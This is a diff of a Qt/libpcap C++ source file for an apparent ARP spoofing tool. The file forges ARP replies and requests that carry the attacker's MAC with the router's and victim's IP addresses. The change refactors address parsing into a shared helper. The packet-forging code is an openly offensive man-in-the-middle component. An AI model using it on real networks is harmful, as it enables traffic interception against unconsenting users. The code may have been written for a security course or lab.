@@ -1,13 +1,9 @@
 #include "relay_falsify.h"
 #include <QCoreApplication>
 #include <QHostAddress>
-#define IP_ADDR_LEN 4
 
 void request_packet();
 void reply_packet();
-void falsify_addr_filter(char *get, u_char *my, int size);
-void falsify_filter(char *get, u_char *my, int size);
-//void reply_print_packet(int len, u_char *packet);
 
 QString relay_len, relay_atk_mac, relay_router_ip, relay_router_mac, relay_victim_ip, relay_victim_mac;
 u_char *relay_packet, falsifyAtkMac[6] = {0,}, falsifyRouterMac[6] = {0,}, falsifyVictimMac[6] = {0,};
@@ -54,27 +50,27 @@ void reply_packet() {
     struct libnet_arp_hdr *arph;
     arph = (struct libnet_arp_hdr*)(relay_packet + sizeof(struct libnet_ethernet_hdr));
 
-    falsify_addr_filter(relay_victim_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
-    if(stop_flag) falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN);
-    else falsify_addr_filter(relay_router_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN);
+    pre_filter(relay_victim_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
+    if(stop_flag) pre_filter(relay_atk_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN, "upper");
+    else pre_filter(relay_router_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN, "upper");
 
     relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha);
 
     *(relay_packet + 1) = ARPOP_REPLY;
-    if(stop_flag) falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
-    else falsify_addr_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
-    falsify_addr_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + ETHER_ADDR_LEN, IP_ADDR_LEN);
+    if(stop_flag) pre_filter(relay_atk_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
+    else pre_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
+    pre_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + ETHER_ADDR_LEN, IP_ADDR_LEN, "lower");
 
     relay_packet += sizeof(arph->ar_sha) + sizeof(arph->ar_spa);
 
-    falsify_addr_filter(relay_victim_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
-    falsify_addr_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + ETHER_ADDR_LEN, IP_ADDR_LEN);
+    pre_filter(relay_victim_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "lower");
+    pre_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + ETHER_ADDR_LEN, IP_ADDR_LEN, "lower");
 
     relay_packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dha) - sizeof(arph->ar_dpa);
 
     pcap_sendpacket(relay_pcap, relay_packet, relay_len.toInt());
 //    printf("////////////////// This is reply ///////////////////");
-//    reply_print_packet(relay_len.toInt(), pack);
+//    print_packet(relay_len.toInt(), pack);
 }
 
 void request_packet() {
@@ -82,10 +78,10 @@ void request_packet() {
     struct libnet_arp_hdr *arph;
     arph = (struct libnet_arp_hdr*)(relay_packet + sizeof(struct libnet_ethernet_hdr));
 
-    falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN);
-    falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha), ETHER_ADDR_LEN);
-    falsify_addr_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa), IP_ADDR_LEN);
-    falsify_addr_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa), IP_ADDR_LEN);
+    pre_filter(relay_atk_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN, "upper");
+    pre_filter(relay_atk_mac.toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha), ETHER_ADDR_LEN, "upper");
+    pre_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa), IP_ADDR_LEN, "lower");
+    pre_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa), IP_ADDR_LEN, "lower");
 
     if(!(cnt % 2)) {
         for(i = 0; i < ETHER_ADDR_LEN; i++) *(relay_packet + i) = *(bc_f + i);
@@ -95,11 +91,11 @@ void request_packet() {
         for(i = 0; i < ETHER_ADDR_LEN; i++) *(relay_packet + i) = *(bc_0 + i);
     }
     else {
-        falsify_addr_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
+        pre_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
         relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha);
         *(relay_packet - 1) = ARPOP_REPLY;
         relay_packet += sizeof(arph->ar_sha) + sizeof(arph->ar_spa);
-        falsify_addr_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
+        pre_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN, "upper");
     }
     cnt++;
 
@@ -107,51 +103,9 @@ void request_packet() {
 
     pcap_sendpacket(relay_pcap, relay_packet, relay_len.toInt());
 //    printf("////////////////// This is request ///////////////////");
-//    reply_print_packet(relay_len.toInt(), pack);
+//    print_packet(relay_len.toInt(), pack);
 }
 
-void falsify_addr_filter(char *get, u_char *my, int size) {	// owner mac address save at my_mac variable
-    if(size == ETHER_ADDR_LEN) for(int i = 0, j = 0; i < ETHER_ADDR_LEN; i++, j+=2) falsify_filter(get + j, my + i, size);
-    else for(int i = 0, j = 0; i < IP_ADDR_LEN; i++, j+=2) falsify_filter(get + j, my + i, size);
-}
-
-// Mac Addr filter is capital, IP Addr filter is small letter! So char - '0' value has difference.
-void falsify_filter(char *get, u_char *my, int size) {
-    if(size == ETHER_ADDR_LEN)
-        if(*get - '0' < 0x10) {
-            *my = (*get - '0') * 0x10;
-            if(*(get+1) - '0' < 0x10) *my += (*(get+1) - '0') * 0x01;
-            else *my += (*(get+1) - '0' == 0x11) ? 0x0A : ((*(get+1) - '0' == 0x12) ? 0x0B : ((*(get+1) - '0' == 0x13) ? 0x0C : ((*(get+1) - '0' == 0x14) ? 0x0D : ((*(get+1) - '0' == 0x15) ? 0x0E : 0x0F))));
-        }
-        else {
-            *my = (*get - '0' == 0x11) ? 0xA0 : ((*get - '0' == 0x12) ? 0xB0 : ((*get - '0' == 0x13) ? 0xC0 : ((*get - '0' == 0x14) ? 0xD0 : ((*get - '0' == 0x15) ? 0xE0 : 0xF0))));
-            if(*(get+1) - '0' < 0x10) *my += (*(get+1) - '0') * 0x01;
-            else *my += (*(get+1) - '0' == 0x11) ? 0x0A : ((*(get+1) - '0' == 0x12) ? 0x0B : ((*(get+1) - '0' == 0x13) ? 0x0C : ((*(get+1) - '0' == 0x14) ? 0x0D : ((*(get+1) - '0' == 0x15) ? 0x0E : 0x0F))));
-        }
-    else {
-        if(*get - '0' < 0x10) {
-            *my = (*get - '0') * 0x10;
-            if(*(get+1) - '0' < 0x10) *my += (*(get+1) - '0') * 0x01;
-            else *my += (*(get+1) - '0' == 0x31) ? 0x0A : ((*(get+1) - '0' == 0x32) ? 0x0B : ((*(get+1) - '0' == 0x33) ? 0x0C : ((*(get+1) - '0' == 0x34) ? 0x0D : ((*(get+1) - '0' == 0x35) ? 0x0E : 0x0F))));
-        }
-        else {
-            *my = (*get - '0' == 0x31) ? 0xA0 : ((*get - '0' == 0x32) ? 0xB0 : ((*get - '0' == 0x33) ? 0xC0 : ((*get - '0' == 0x34) ? 0xD0 : ((*get - '0' == 0x35) ? 0xE0 : 0xF0))));
-            if(*(get+1) - '0' < 0x10) *my += (*(get+1) - '0') * 0x01;
-            else *my += (*(get+1) - '0' == 0x31) ? 0x0A : ((*(get+1) - '0' == 0x32) ? 0x0B : ((*(get+1) - '0' == 0x33) ? 0x0C : ((*(get+1) - '0' == 0x34) ? 0x0D : ((*(get+1) - '0' == 0x35) ? 0x0E : 0x0F))));
-        }
-    }
-}
-/*
-void reply_print_packet(int len, u_char *packet) {
-    int cnt = 0;
-    printf("\n");
-    while(--len != 0) {
-        printf("%02x ", *(packet++));
-        if ((++cnt % 16) == 0) printf("\n");
-    }
-    printf("%02x\n", *packet);
-}
-*/
 void relay_falsify::relayGetInfo(QString a, QString b, QString c, QString d, QString e, QString f, u_char *g, pcap_t *h) {
     relay_victim_ip = a;
     relay_victim_mac = b;
